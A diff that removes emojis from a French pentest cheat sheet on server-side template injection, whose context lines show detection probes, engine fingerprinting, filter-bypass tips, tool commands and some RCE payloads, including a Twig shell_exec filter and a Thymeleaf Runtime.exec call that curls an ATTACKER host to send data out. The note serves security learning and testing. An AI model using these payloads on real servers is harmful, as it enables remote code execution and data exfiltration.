@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🎨 SSTI — Server Side Template Injection
+# SSTI — Server Side Template Injection
 
 > [!info] **En 1 phrase**
 > SSTI = injecter des **balises et expressions de template** dans une entrée utilisateur
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -37,7 +37,7 @@ flowchart LR
     D -->|Affiché tel quel| I[Simple interpolation<br>échappée → pas de SSTI]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Un moteur de template (Jinja2, Twig, Freemarker…) évalue les expressions entre balises
 > (`{{ }}`, `${ }`, `<% %>`...). Si l'entrée utilisateur est **concatenée dans le template
 > puis rendue** sans échappement, on insère nos propres expressions → le serveur exécute
@@ -45,9 +45,9 @@ flowchart LR
 
 ---
 
-## 🕵️ Détection
+## Détection
 
-> [!tip] 💡 **Où chercher ?** Les fonctionnalités qui génèrent des **PDF, factures, emails,
+> [!tip] **Où chercher ?** Les fonctionnalités qui génèrent des **PDF, factures, emails,
 > prévisualisations, CV, rapports** utilisent presque toujours un template. Cibles de choix.
 
 ### Tags à tester (toutes les syntaxes)
@@ -68,7 +68,7 @@ ${7*7}
 # Si la réponse contient "49" → le moteur évalue nos expressions
 ```
 
-> [!warning] ⚠️ Interpolation ≠ injection : si `{{7*7}}` reste **littéralement** `{{7*7}}`
+> [!warning] Interpolation ≠ injection : si `{{7*7}}` reste **littéralement** `{{7*7}}`
 > dans la réponse, l'entrée est échappée ou jamais interprétée → pas de SSTI exploitable.
 
 ### 2. Polyglot d'erreur (Error-Based)
@@ -103,9 +103,9 @@ ${{<%[%'"}}%\.
 
 ---
 
-## 🏷️ Identification du moteur
+## Identification du moteur
 
-> [!tip] 💡 **Discriminateur rapide** : la multiplication chaîne/int.
+> [!tip] **Discriminateur rapide** : la multiplication chaîne/int.
 
 | Payload | Résultat | Moteur |
 |---|---|---|
@@ -125,7 +125,7 @@ Handlebars, Nunjucks, EJS), Go (text/template, html/template).
 
 ---
 
-## 🐍 Jinja2 (Python)
+## Jinja2 (Python)
 
 ```jinja2
 {# Fuite de configuration #}
@@ -161,7 +161,7 @@ Handlebars, Nunjucks, EJS), Go (text/template, html/template).
 
 ---
 
-## 🐘 Twig (PHP)
+## Twig (PHP)
 
 ```twig
 {{7*7}}                # → 49
@@ -187,12 +187,12 @@ Handlebars, Nunjucks, EJS), Go (text/template, html/template).
 {{['id']|filter('shell_exec')}}
 ```
 
-> [!warning] ⚠️ `_self.env...` ne fonctionne **plus sur Twig 2/3** (propriété `env` supprimée).
+> [!warning] `_self.env...` ne fonctionne **plus sur Twig 2/3** (propriété `env` supprimée).
 > Toujours tester les deux familles de payloads.
 
 ---
 
-## 🔥 Smarty (PHP)
+## Smarty (PHP)
 
 ```smarty
 {$smarty.version}                            # version du moteur
@@ -216,7 +216,7 @@ Handlebars, Nunjucks, EJS), Go (text/template, html/template).
 
 ---
 
-## ☕ Freemarker (Java)
+## Freemarker (Java)
 
 ```freemarker
 ${7*7}                                   # → 49
@@ -239,7 +239,7 @@ ${.version}
 
 ---
 
-## 🚀 Velocity (Java)
+## Velocity (Java)
 
 ```velocity
 #set($x=7*7)${x}                         # → 49
@@ -261,7 +261,7 @@ $pb.start()
 
 ---
 
-## 💎 ERB (Ruby)
+## ERB (Ruby)
 
 ```erb
 <%= 7*7 %>                               # → 49
@@ -276,7 +276,7 @@ $pb.start()
 
 ---
 
-## 🍃 Thymeleaf (Java)
+## Thymeleaf (Java)
 
 ```thymeleaf
 [[${7*7}]]                               # → 49 (inline)
@@ -290,7 +290,7 @@ ${T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER/' + ...)}
 
 ---
 
-## 🧱 Pebble (Java)
+## Pebble (Java)
 
 ```pebble
 {{7*7}}                                  # → 49
@@ -303,7 +303,7 @@ ${T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER/' + ...)}
 
 ---
 
-## 🖼️ Handlebars / Mustache
+## Handlebars / Mustache
 
 ```handlebars
 # Mustache = "logic-less" : {{7*7}} reste littéral → AUCUNE évaluation par défaut.
@@ -334,7 +334,7 @@ ${T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER/' + ...)}
 
 ---
 
-## 🧊 Jade / Pug (Node)
+## Jade / Pug (Node)
 
 ```pug
 #{(7*7)}                                 # → 49 (Jade)
@@ -350,7 +350,7 @@ ${T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER/' + ...)}
 
 ---
 
-## 🐹 Go template
+## Go template
 
 ```go
 // text/template : les expressions arithmétiques sont évaluées
@@ -367,7 +367,7 @@ ${T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER/' + ...)}
 
 ---
 
-## 🐍 Mako (Python) & Genshi (Python)
+## Mako (Python) & Genshi (Python)
 
 ```python
 # Mako
@@ -385,7 +385,7 @@ ${7*7}                                       # → 49
 
 ---
 
-## 🔓 Bypass de filtres (Jinja2 en priorité)
+## Bypass de filtres (Jinja2 en priorité)
 
 ```jinja2
 {# Underscores bloqués : utiliser |attr() au lieu de l'accès direct #}
@@ -417,14 +417,14 @@ ${7*7}                                       # → 49
 # En URL : encoder %7b%7b ... %7d%7d (double encodage si WAF)
 ```
 
-> [!warning] ⚠️ **Filtre `os` / `popen`** : testez systématiquement `request.args.<var>`
+> [!warning] **Filtre `os` / `popen`** : testez systématiquement `request.args.<var>`
 > avant d'attaquer les bypass d'underscore — c'est de loin le plus propre et le plus fiable.
 > Sur les environnements sans `request` (hors Flask), priorité aux concaténations `'o'+'s'`
 > et à l'encodage hex/octal.
 
 ---
 
-## 🧬 Polyglots
+## Polyglots
 
 ```bash
 # Polyglot d'erreur universel (source PayloadsAllTheThings)
@@ -435,14 +435,14 @@ ${{<%[%'"}}%\.
 {{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}  [[${7*7}]]
 ```
 
-> [!tip] 💡 La **Hackmanit Template Injection Table** répertorie les polyglots et leurs
+> [!tip] La **Hackmanit Template Injection Table** répertorie les polyglots et leurs
 > réponses attendues pour **44 moteurs de templates** → identification automatique du moteur
 > d'après la transformation du payload.
 > `https://github.com/Hackmanit/template-injection-table`
 
 ---
 
-## 🙈 Blind SSTI
+## Blind SSTI
 
 ```bash
 # Time-Based : forcer un délai via la commande (si RCE probable)
@@ -468,7 +468,7 @@ ${{<%[%'"}}%\.
 
 ---
 
-## 🛠️ Outils
+## Outils
 
 ```bash
 # TInjA (Hackmanit) — scanner SSTI + CSTI avec polyglots avancés
@@ -491,12 +491,12 @@ python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV
 # Comparer rendu, timing et code HTTP entre requêtes paires (blind)
 ```
 
-> [!tip] 💡 Le wildcard `*` dans l'URL (`name=John*`) marque le point d'injection
+> [!tip] Le wildcard `*` dans l'URL (`name=John*`) marque le point d'injection
 > pour tplmap/SSTImap — il **doit** être remplacé par notre payload.
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -512,15 +512,15 @@ python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre logique d'attaque**
+> [!tip] **Ordre logique d'attaque**
 > 1. **Math** : `{{7*7}}` → rendu = injectable.
 > 2. **Déterminer le moteur** : `{{7*'7'}}` (Jinja2=`7777777` / Twig=`49`), erreurs, version.
 > 3. **RCE spécifique au moteur** (voir sections ci-dessus).
 > 4. Si pas de sortie : **blind** (time / boolean / OOB) puis reverse shell.
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - **Interpolation simple ≠ SSTI** : si `{{7*7}}` reste littéral, l'entrée est échappée ou jamais interprétée — chercher un autre point d'injection.
 > - **Version du moteur = tout** : Twig 1.x `_self.env` ≠ Twig 2/3 (`|filter('system')`) ; Smarty `{php}` supprimé en 3.1 ; Jinja2 sandboxed retire `cycler`/`lipsum` → repli sur `config`, `request`, `self`, `namespace`.
 > - `{{7*'7'}}` : Jinja2 → `7777777` (str×int), Twig → `49` (cast int). Le meilleur discriminateur rapide.
@@ -531,11 +531,11 @@ python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Injection SQL|💾 SQLi]]
-- [[Injection de commandes|🐚 Injection de commandes]]
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
-- 🔬 Paper de référence : [Server-Side Template Injection: RCE For The Modern Web App — James Kettle](https://portswigger.net/knowledgebase/papers/serversidetemplateinjection.pdf)
+- [[Injection SQL| SQLi]]
+- [[Injection de commandes| Injection de commandes]]
+- [[XSS (Cross-Site Scripting)| XSS]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
+- Paper de référence : [Server-Side Template Injection: RCE For The Modern Web App — James Kettle](https://portswigger.net/knowledgebase/papers/serversidetemplateinjection.pdf)
